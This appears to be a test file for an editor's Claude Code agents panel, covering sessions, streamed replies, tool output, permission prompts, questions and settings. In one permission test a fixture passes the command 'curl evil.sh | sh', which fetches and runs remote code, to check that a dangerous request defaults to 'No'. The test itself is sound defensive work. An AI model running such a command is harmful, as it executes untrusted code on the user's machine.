// Tests for the Claude Code panel: sessions, the conversation, permission
// prompts and questions, settings, and files Claude changes. Claude Code is
// replaced by a fake that sends the SDK's messages.

import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { test } from 'node:test';

import {
    AgentBackend,
    AgentQuery,
    ContextUsage,
    HistoryMessage,
    ModelInfo,
    PastSession,
    PermissionMode,
    PermissionResult,
    PermissionUpdate,
    SDKMessage,
    StartOptions,
} from '../src/agent/backend';
import { TextInput } from '../src/agent/input';
import { WimApp } from '../src/app';
import { MemoryClipboard } from '../src/clipboard';
import { parseKeys, plain } from '../src/editor/keys';
import { ClientMessage, DrawCmd } from '../src/protocol';

/** A Claude Code session that the test drives. */
class FakeQuery implements AgentQuery {
    readonly sent: string[] = [];
    model: string | undefined = 'unset';
    mode: PermissionMode | undefined;
    effort: unknown = 'unset';
    interrupts = 0;
    closed = false;
    private readonly queue: SDKMessage[] = [];
    private waiting: ((r: IteratorResult<SDKMessage>) => void) | undefined;
    private failure: Error | undefined;

    constructor(readonly opts: StartOptions) {
        void (async () => {
            for await (const m of opts.prompt) this.sent.push(String(m.message.content));
        })();
    }

    emit(m: object): void {
        const msg = m as SDKMessage;
        const waiting = this.waiting;
        this.waiting = undefined;
        if (waiting) waiting({ value: msg, done: false });
        else this.queue.push(msg);
    }

    /** The process dies. */
    fail(message: string): void {
        this.failure = new Error(message);
        this.waiting?.({ value: undefined, done: true });
    }

    /** Ask the panel for permission, as Claude Code does before a tool. */
    ask(tool: string, input: Record<string, unknown>, extra: { suggestions?: PermissionUpdate[]; defaultToNo?: boolean } = {}): Promise<PermissionResult | null> {
        return this.opts.canUseTool(tool, input, { signal: new AbortController().signal, toolUseID: `use-${tool}`, requestId: 'r', ...extra });
    }

    [Symbol.asyncIterator](): AsyncIterator<SDKMessage> {
        return {
            next: () => {
                if (this.queue.length > 0) return Promise.resolve({ value: this.queue.shift()!, done: false });
                if (this.closed) return Promise.resolve({ value: undefined, done: true });
                return new Promise((resolve, reject) => {
                    this.waiting = (r) => (this.failure ? reject(this.failure) : resolve(r));
                });
            },
        };
    }

    interrupt(): Promise<unknown> {
        this.interrupts++;
        return Promise.resolve();
    }

    setModel(model?: string): Promise<void> {
        this.model = model;
        return Promise.resolve();
    }

    setPermissionMode(mode: PermissionMode): Promise<void> {
        this.mode = mode;
        return Promise.resolve();
    }

    applyFlagSettings(settings: { effortLevel?: unknown }): Promise<void> {
        this.effort = settings.effortLevel;
        return Promise.resolve();
    }

    supportedModels(): Promise<ModelInfo[]> {
        return Promise.resolve([
            { value: 'default', displayName: 'Default (recommended)', description: 'The best model for you' },
            { value: 'opus', displayName: 'Opus 5.5', description: 'The most capable' },
            { value: 'haiku', displayName: 'Haiku 5.5', description: 'The fastest' },
        ]);
    }

    getContextUsage(): Promise<ContextUsage> {
        return Promise.resolve({
            categories: [
                { id: 'system_tools', name: 'System tools', tokens: 26000, color: '', kind: 'used' },
                { id: 'messages', name: 'Messages', tokens: 8000, color: '', kind: 'used' },
                { id: 'free_space', name: 'Free space', tokens: 966000, color: '', kind: 'free' },
            ],
            totalTokens: 34000,
            maxTokens: 1000000,
            percentage: 3.4,
        } as unknown as ContextUsage);
    }

    close(): void {
        this.closed = true;
        this.waiting?.({ value: undefined, done: true });
    }
}

class FakeBackend implements AgentBackend {
    readonly queries: FakeQuery[] = [];
    past: PastSession[] = [];
    histories: Record<string, HistoryMessage[]> = {};

    start(opts: StartOptions): Promise<AgentQuery> {
        const q = new FakeQuery(opts);
        this.queries.push(q);
        return Promise.resolve(q);
    }

    listSessions(): Promise<PastSession[]> {
        return Promise.resolve(this.past);
    }

    history(id: string): Promise<HistoryMessage[]> {
        return Promise.resolve(this.histories[id] ?? []);
    }

    title(): Promise<string | undefined> {
        return Promise.resolve('Named by Claude');
    }

    get last(): FakeQuery {
        return this.queries[this.queries.length - 1];
    }
}

// Messages as Claude Code sends them.
const init = (id = 'session-1'): object => ({ type: 'system', subtype: 'init', session_id: id, model: 'claude-opus-5-5', permissionMode: 'default' });
const assistant = (...content: object[]): object => ({ type: 'assistant', parent_tool_use_id: null, message: { content } });
const text = (t: string): object => assistant({ type: 'text', text: t });
const toolUse = (id: string, name: string, input: object): object => assistant({ type: 'tool_use', id, name, input });
const toolResult = (id: string, content: string, isError = false): object => ({
    type: 'user',
    parent_tool_use_id: null,
    message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content, is_error: isError }] },
});
const result = (cost = 0.0123): object => ({ type: 'result', subtype: 'success', is_error: false, result: '', total_cost_usd: cost });
const streamText = (t: string): object[] => [
    { type: 'stream_event', parent_tool_use_id: null, event: { type: 'message_start' } },
    { type: 'stream_event', parent_tool_use_id: null, event: { type: 'content_block_start', content_block: { type: 'text' } } },
    { type: 'stream_event', parent_tool_use_id: null, event: { type: 'content_block_delta', delta: { type: 'text_delta', text: t } } },
];

/** Let the sessions take in what was sent, and repaint. */
async function settle(): Promise<void> {
    for (let i = 0; i < 6; i++) await new Promise((r) => setImmediate(r));
}

function tempDir(name: string): string {
    return fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), `wim-${name}-`)));
}

interface Harness {
    app: WimApp;
    backend: FakeBackend;
    clipboard: MemoryClipboard;
    send: (msg: ClientMessage) => void;
    type: (keys: string) => void;
    /** All text drawn in the last frame. */
    text: () => string;
    last: () => DrawCmd[];
}

function harness(file?: string): Harness {
    const frames: DrawCmd[][] = [];
    const backend = new FakeBackend();
    const clipboard = new MemoryClipboard();
    const app = new WimApp({
        path: file,
        icons: false,
        clipboard,
        servers: [],
        agents: backend,
        onFrame: (_title, _dirty, cmds) => frames.push(cmds),
        onQuit: () => {},
    });
    const send = (msg: ClientMessage): void => app.handleMessage(msg);
    send({ t: 'resize', width: 1400, height: 800, charW: 10, lineH: 20 });
    const last = (): DrawCmd[] => frames[frames.length - 1];
    return {
        app,
        backend,
        clipboard,
        send,
        type: (keys) => {
            for (const k of parseKeys(keys)) send({ t: 'key', key: k.key, ctrl: k.ctrl, alt: k.alt });
        },
        text: () =>
            last()
                .filter((c): c is Extract<DrawCmd, ['text', ...unknown[]]> => c[0] === 'text')
                .map((c) => c[3])
                .join('\n'),
        last,
    };
}

/** Open the panel and send a message, with Claude Code starting up. */
async function chat(h: Harness, message: string): Promise<FakeQuery> {
    h.send({ t: 'command', name: 'agents' });
    h.type(`${message}<CR>`);
    await settle();
    const q = h.backend.last;
    q.emit(init());
    await settle();
    return q;
}

test('Cmd+L shows the agents panel at its prompt, and Ctrl+h / Ctrl+l move between it and the editor', () => {
    const h = harness();
    assert.doesNotMatch(h.text(), / AGENT /);
    assert.match(h.text(), /✻ Agents/, 'the badge in the status line');
    h.send({ t: 'command', name: 'agents' });
    assert.match(h.text(), / AGENT /);
    assert.match(h.text(), /Ask the agent…/);
    assert.match(h.text(), /New session/);
    // Typing goes to the prompt, not the buffer.
    h.type('ihello');
    assert.equal(h.app.editor.buffer.text(), '');
    assert.match(h.text(), /ihello/);
    h.type('<Esc><C-h>');
    assert.match(h.text(), /NORMAL/);
    h.type('<C-l>');
    assert.match(h.text(), / AGENT /);
    // From the panel, Cmd+L hides it.
    h.send({ t: 'command', name: 'agents' });
    assert.doesNotMatch(h.text(), /New session/);
    assert.match(h.text(), /NORMAL/);
    // So does clicking the badge, which also shows it.
    h.send({ t: 'mouse', kind: 'down', x: 1395, y: 770 });
    h.send({ t: 'mouse', kind: 'up', x: 1395, y: 770 });
    assert.match(h.text(), /New session/);
    h.type('<Esc>q');
    assert.doesNotMatch(h.text(), /New session/);
});

test('a message goes to Claude Code, and the reply streams in', async () => {
    const h = harness();
    const q = await chat(h, 'hello there');
    assert.deepEqual(q.sent, ['hello there']);
    assert.equal(q.opts.resume, undefined);
    assert.match(h.text(), /❯ \nhello there|hello there/);
    for (const m of streamText('Hi, how can')) q.emit(m);
    await settle();
    assert.match(h.text(), /Hi, how can/);
    assert.match(h.text(), /Working…/);
    q.emit(text('Hi, how can I help?'));
    q.emit(result());
    await settle();
    assert.match(h.text(), /Hi, how can I help\?/);
    assert.doesNotMatch(h.text(), /Working…/);
    assert.match(h.text(), /\$0\.01/);
    assert.match(h.text(), /Opus 5\.5/, 'the model the session reported');
    assert.match(h.text(), /3% context/);
    assert.match(h.text(), /Named by Claude/, 'the title Claude Code gave it');
    // `y` copies the reply.
    h.type('<Esc>y');
    assert.equal(h.clipboard.text, 'Hi, how can I help?');
});

test('tool calls show what they did, and files Claude edits are reloaded', async () => {
    const dir = tempDir('agent-edit');
    const file = path.join(dir, 'a.txt');
    const other = path.join(dir, 'b.txt');
    fs.writeFileSync(file, 'one\ntwo\n');
    fs.writeFileSync(other, 'mine\n');
    const h = harness(file);
    h.type(':e b.txt<CR>Ochanged<Esc>');
    const q = await chat(h, 'edit them');
    q.emit(toolUse('t1', 'Edit', { file_path: file, old_string: 'two', new_string: 'TWO' }));
    await settle();
    assert.match(h.text(), /Edit/);
    assert.match(h.text(), /a\.txt/);
    fs.writeFileSync(file, 'one\nTWO\n');
    q.emit(toolResult('t1', 'The file has been updated.'));
    await settle();
    assert.match(h.text(), /- two/);
    assert.match(h.text(), /\+ TWO/);
    h.type('<Esc><C-h>:b a.txt<CR>');
    assert.equal(h.app.editor.buffer.text(), 'one\nTWO', 'reloaded from disk');
    assert.equal(h.app.editor.isModified(), false);
    h.type('u');
    assert.equal(h.app.editor.buffer.text(), 'one\ntwo', 'the reload can be undone');
    h.type('<C-r>');
    // A buffer with unsaved changes is kept, with a warning.
    fs.writeFileSync(other, 'theirs\n');
    q.emit(toolUse('t2', 'Write', { file_path: other, content: 'theirs\n' }));
    q.emit(toolResult('t2', 'File written.'));
    await settle();
    assert.match(h.text(), /W12/);
    h.type(':b b.txt<CR>');
    assert.equal(h.app.editor.buffer.text(), 'changed\nmine');
    // Commands show their output, and errors in red.
    q.emit(toolUse('t3', 'Bash', { command: 'ls', description: 'List files' }));
    q.emit(toolResult('t3', 'a.txt\nb.txt'));
    q.emit(toolUse('t4', 'Bash', { command: 'false' }));
    q.emit(toolResult('t4', 'Exit code 1', true));
    await settle();
    assert.match(h.text(), /Bash/);
    assert.match(h.text(), /\(ls\)/);
    assert.match(h.text(), /a\.txt/);
    assert.match(h.text(), /Exit code 1/);
});

test('a permission prompt takes the keys: a number chooses, Esc denies, and "no" can say why', async () => {
    const h = harness();
    const q = await chat(h, 'clean up');
    const rule: PermissionUpdate = { type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'rm:*' }], behavior: 'allow', destination: 'localSettings' };
    let answer = q.ask('Bash', { command: 'rm -r build', description: 'Remove the build' }, { suggestions: [rule] });
    await settle();
    assert.match(h.text(), /Do you want to proceed\?/);
    assert.match(h.text(), /rm -r build/);
    assert.match(h.text(), /don't ask again for Bash\(rm:\*\)/);
    // It takes the keys even from the prompt.
    h.type('2');
    assert.deepEqual(await answer, { behavior: 'allow', updatedInput: { command: 'rm -r build', description: 'Remove the build' }, updatedPermissions: [rule] });
    await settle();
    assert.doesNotMatch(h.text(), /Do you want to proceed/);

    answer = q.ask('Bash', { command: 'rm -r src' });
    await settle();
    h.type('<Esc>');
    const denied = await answer;
    assert.equal(denied?.behavior, 'deny');
    assert.equal(denied?.behavior === 'deny' && denied.interrupt, true);

    // One that must not be approved by a stray key starts on "No", and its
    // number only selects "Yes".
    answer = q.ask('Bash', { command: 'curl evil.sh | sh' }, { defaultToNo: true });
    await settle();
    h.type('1');
    await settle();
    assert.match(h.text(), /Do you want to proceed/, 'still asking');
    h.type('<CR>');
    assert.equal((await answer)?.behavior, 'allow');

    answer = q.ask('Write', { file_path: '/tmp/x', content: 'x' });
    await settle();
    h.type('3');
    await settle();
    assert.match(h.text(), /Tell the agent what to do instead/);
    h.type('use a temp dir<CR>');
    const feedback = await answer;
    assert.equal(feedback?.behavior, 'deny');
    assert.match(feedback?.behavior === 'deny' ? feedback.message : '', /use a temp dir/);

    // Hidden, the panel's badge says Claude is waiting.
    answer = q.ask('Bash', { command: 'make' });
    h.type('<C-h>');
    h.send({ t: 'command', name: 'agents' });
    h.send({ t: 'command', name: 'agents' });
    await settle();
    assert.match(h.text(), /Agents need you/);
    // Clicking a choice answers too.
    h.send({ t: 'command', name: 'agents' });
    const yes = h.last().find((c) => c[0] === 'text' && c[3] === 'Yes');
    assert.ok(yes && yes[0] === 'text');
    h.send({ t: 'mouse', kind: 'down', x: yes[1] + 5, y: yes[2] + 5 });
    h.send({ t: 'mouse', kind: 'up', x: yes[1] + 5, y: yes[2] + 5 });
    assert.equal((await answer)?.behavior, 'allow');
});

test('AskUserQuestion is answered from the panel, one question at a time', async () => {
    const h = harness();
    const q = await chat(h, 'help me choose');
    const questions = [
        { question: 'Which database?', header: 'Database', multiSelect: false, options: [{ label: 'Postgres', description: 'Relational' }, { label: 'SQLite', description: 'A file' }] },
        { question: 'Which features?', header: 'Features', multiSelect: true, options: [{ label: 'Auth', description: '' }, { label: 'Search', description: '' }, { label: 'Billing', description: '' }] },
        { question: 'Name?', header: 'Name', multiSelect: false, options: [{ label: 'app', description: '' }, { label: 'svc', description: '' }] },
    ];
    const answer = q.ask('AskUserQuestion', { questions });
    await settle();
    assert.match(h.text(), /Which database\?/);
    assert.match(h.text(), /\(1\/3\)/);
    h.type('2');
    await settle();
    assert.match(h.text(), /Which features\?/);
    h.type('1j<Space>j<Space><CR>');
    await settle();
    assert.match(h.text(), /Name\?/);
    h.type('3');
    assert.match(h.text(), /Type your answer/);
    h.type('wim<CR>');
    const r = await answer;
    assert.equal(r?.behavior, 'allow');
    assert.deepEqual(r?.behavior === 'allow' && r.updatedInput?.answers, { 'Which database?': 'SQLite', 'Which features?': 'Auth, Search, Billing', 'Name?': 'wim' });
});

test('the model, permission mode and effort can be changed', async () => {
    const h = harness();
    const q = await chat(h, 'hi');
    h.type('<Esc>m');
    await settle();
    assert.match(h.text(), /Haiku 5\.5/);
    h.type('haiku<CR>');
    await settle();
    assert.equal(q.model, 'haiku');
    assert.match(h.text(), /Model set to Haiku 5\.5/);
    // Shift+Tab cycles the permission mode, as in the terminal.
    h.type('<S-Tab>');
    await settle();
    assert.equal(q.mode, 'acceptEdits');
    assert.match(h.text(), /accept edits on/);
    h.type('pbypass<CR>');
    await settle();
    assert.equal(q.mode, 'bypassPermissions');
    h.type('<S-Tab>');
    assert.equal(q.mode, 'default', 'from a mode Shift+Tab does not reach, back to the start');
    h.type('emax<CR>');
    await settle();
    assert.equal(q.effort, 'max');
    assert.match(h.text(), /\nmax\n/);
    // Before Claude Code starts, the choices wait for it.
    h.type('n<Esc>pplan<CR>');
    h.type('i<CR>');
    h.type('go<CR>');
    await settle();
    assert.equal(h.backend.last.opts.permissionMode, 'plan');
});

test('Ctrl+x interrupts Claude, and Ctrl+c leaves the prompt as Esc does', async () => {
    const h = harness();
    const q = await chat(h, 'do a long thing');
    for (const m of streamText('Starting')) q.emit(m);
    await settle();
    assert.match(h.text(), /Working…/);
    h.send({ t: 'key', key: 'x', ctrl: true, alt: false });
    await settle();
    assert.equal(q.interrupts, 1);
    assert.doesNotMatch(h.text(), /Working…/);
    // What Claude had said comes after, without the spinner, then Claude
    // Code's note that it was interrupted.
    q.emit(text('Starting the long'));
    q.emit({ type: 'user', parent_tool_use_id: null, message: { role: 'user', content: [{ type: 'text', text: '[Request interrupted by user]' }] } });
    await settle();
    assert.doesNotMatch(h.text(), /Working…/);
    assert.match(h.text(), /Starting the long\n[^]*Interrupted/);
    // The result that ends the interrupted turn is no error, and doesn't say
    // so again.
    q.emit({ type: 'result', subtype: 'error_during_execution', is_error: true, total_cost_usd: 0.02 });
    await settle();
    assert.doesNotMatch(h.text(), /Stopped by an error/);
    assert.equal(h.text().match(/Interrupted/g)?.length, 1);
    // Ctrl+c doesn't interrupt: it goes to Normal mode, keeping the draft,
    // and from there to the editor.
    h.type('go on<CR>');
    await settle();
    h.type('draft');
    h.send({ t: 'key', key: 'c', ctrl: true, alt: false });
    assert.equal(q.interrupts, 1);
    assert.match(h.text(), /Working…/);
    assert.match(h.text(), /draft/);
    assert.match(h.text(), /i to type/);
    h.type('j');
    assert.match(h.text(), /\ndraft\n/, 'j scrolled rather than typed');
    h.send({ t: 'key', key: 'c', ctrl: true, alt: false });
    assert.match(h.text(), /NORMAL/);
    // `S` clears the prompt and types in it.
    h.send({ t: 'command', name: 'agents' });
    h.type('<Esc>S');
    assert.doesNotMatch(h.text(), /draft/);
    h.type('fresh');
    assert.match(h.text(), /fresh/);
    h.type('<Esc><C-h>');
    // With Claude idle, Ctrl+x only says so.
    q.emit(result());
    await settle();
    h.send({ t: 'command', name: 'agents' });
    h.send({ t: 'key', key: 'x', ctrl: true, alt: false });
    assert.match(h.text(), /The agent isn't working on anything/);
    assert.equal(q.interrupts, 1);
});

test('sessions: n starts another, Tab and numbers switch, s resumes a saved one with its history', async () => {
    const h = harness();
    h.backend.past = [{ id: 'saved-1', title: 'Fix the parser', modified: Date.now() - 3 * 3600_000, branch: 'main' }];
    h.backend.histories['saved-1'] = [
        { type: 'user', parentToolUseId: null, message: { role: 'user', content: '<command-name>/clear</command-name><command-args></command-args>' } },
        { type: 'user', parentToolUseId: null, message: { role: 'user', content: [{ type: 'text', text: 'the parser drops comments' }] } },
        { type: 'assistant', parentToolUseId: null, message: { content: [{ type: 'tool_use', id: 'r1', name: 'Read', input: { file_path: '/p/parser.ts' } }] } },
        { type: 'user', parentToolUseId: null, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'r1', content: 'a\nb\nc' }] } },
        { type: 'assistant', parentToolUseId: 'sub', message: { content: [{ type: 'text', text: 'a subagent says' }] } },
        { type: 'assistant', parentToolUseId: null, message: { content: [{ type: 'text', text: 'Fixed: comments are kept now.' }] } },
    ];
    const first = await chat(h, 'first');
    h.type('<Esc>n');
    h.type('second<CR>');
    await settle();
    assert.equal(h.backend.queries.length, 2);
    assert.deepEqual(h.backend.last.sent, ['second']);
    assert.match(h.text(), /second/);
    h.type('<Esc><Tab>');
    assert.match(h.text(), /first/);
    h.type('2');
    assert.match(h.text(), /second/);
    h.type('s');
    await settle();
    assert.match(h.text(), /Fix the parser/);
    assert.match(h.text(), /3h ago · main/);
    h.type('parser<CR>');
    await settle();
    const t = h.text();
    assert.match(t, /\/clear/);
    assert.match(t, /the parser drops comments/);
    assert.match(t, /Read 3 lines/);
    assert.match(t, /Fixed: comments are kept now\./);
    assert.doesNotMatch(t, /a subagent says/);
    assert.equal(h.backend.queries.length, 2, 'Claude Code starts with the first message');
    h.type('and strings?<CR>');
    await settle();
    assert.equal(h.backend.last.opts.resume, 'saved-1');
    assert.deepEqual(h.backend.last.sent, ['and strings?']);
    // `x` closes a session; a working one only on a second `x`.
    h.type('<Esc>1x');
    assert.equal(first.closed, false);
    assert.match(h.text(), /x again/);
    h.type('x');
    assert.equal(first.closed, true);
    assert.equal(h.app.agents.sessions.length, 2);
});

test('the context is broken down by kind, and help lists the keys', async () => {
    const h = harness();
    const q = await chat(h, 'hi');
    q.emit(text('Hello'));
    q.emit(result());
    await settle();
    h.type('<Esc>c');
    assert.match(h.text(), /34\.0k \/ 1\.0M tokens \(3%\)/);
    assert.match(h.text(), /System tools/);
    assert.match(h.text(), /Free space/);
    h.type('c?');
    assert.match(h.text(), /Keys in the agents panel/);
    h.type('?');
    assert.doesNotMatch(h.text(), /Keys in the agents panel/);
});

test('the conversation scrolls, and follows the end until scrolled up', async () => {
    const h = harness();
    const q = await chat(h, 'count');
    for (let i = 1; i <= 60; i++) q.emit(text(`line number ${i}`));
    await settle();
    assert.match(h.text(), /line number 60/);
    assert.doesNotMatch(h.text(), /line number 1\n/);
    h.type('<Esc>gg');
    assert.match(h.text(), /count/);
    assert.doesNotMatch(h.text(), /line number 60/);
    // New replies don't pull the view away while reading further up.
    q.emit(text('line number 61'));
    await settle();
    assert.doesNotMatch(h.text(), /line number 61/);
    h.type('G');
    assert.match(h.text(), /line number 61/);
    h.send({ t: 'wheel', x: 1300, y: 300, delta: -400, dx: 0, mode: 0, zoom: false });
    assert.doesNotMatch(h.text(), /line number 61/);
});

test(':Agents shows the panel, and with a message sends it', async () => {
    const h = harness();
    h.type(':Agents explain this<CR>');
    await settle();
    assert.match(h.text(), / AGENT /);
    assert.deepEqual(h.backend.last.sent, ['explain this']);
});

test('when Claude Code stops, the next message starts it again on the same session', async () => {
    const h = harness();
    const q = await chat(h, 'one');
    q.emit(result());
    await settle();
    q.fail('process exited with code 1');
    await settle();
    assert.match(h.text(), /The agent stopped: process exited with code 1/);
    h.type('two<CR>');
    await settle();
    assert.equal(h.backend.queries.length, 2);
    assert.equal(h.backend.last.opts.resume, 'session-1');
    assert.deepEqual(h.backend.last.sent, ['two']);
});

test('the prompt edits like a text field, with earlier messages on Up', () => {
    const input = new TextInput();
    const keys = (s: string): void => {
        for (const k of parseKeys(s)) input.key(k);
    };
    keys('hello world');
    input.key({ key: 'Backspace', ctrl: false, alt: true });
    assert.equal(input.text, 'hello ');
    keys('there\\');
    assert.equal(input.key(plain('Enter')), true, 'a backslash before Enter makes a new line');
    input.key({ key: 'Enter', ctrl: false, alt: true });
    keys('end');
    assert.equal(input.text, 'hello there\n\nend');
    assert.deepEqual(input.lines(), { lines: [Array.from('hello there'), [], Array.from('end')], line: 2, col: 3 });
    keys('<Up><Up>');
    assert.equal(input.lines().line, 0);
    keys('<C-a><C-w>X');
    assert.equal(input.text, 'Xhello there\n\nend');
    assert.equal(input.key(plain('Enter')), 'Send');
    input.remember(input.text);
    input.clear();
    keys('draft<Up>');
    assert.equal(input.text, 'Xhello there\n\nend');
    keys('<Down><Down><Down>');
    assert.equal(input.text, 'draft');
});
